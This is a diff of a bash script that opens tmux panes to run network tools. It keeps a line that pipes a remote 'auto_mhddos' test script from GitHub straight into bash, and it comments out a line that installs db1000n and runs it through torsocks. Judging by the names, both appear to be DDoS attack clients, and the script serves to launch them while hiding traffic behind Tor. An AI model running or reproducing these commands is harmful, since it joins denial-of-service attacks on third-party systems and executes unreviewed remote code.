@@ -31,7 +31,7 @@ sleep 0.1
 tmux split-window -v 'vnstat -l'
 sleep 0.1
 tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash'
-sleep 0.1
-tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
+#sleep 0.1
+#tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux -2 attach-session -d
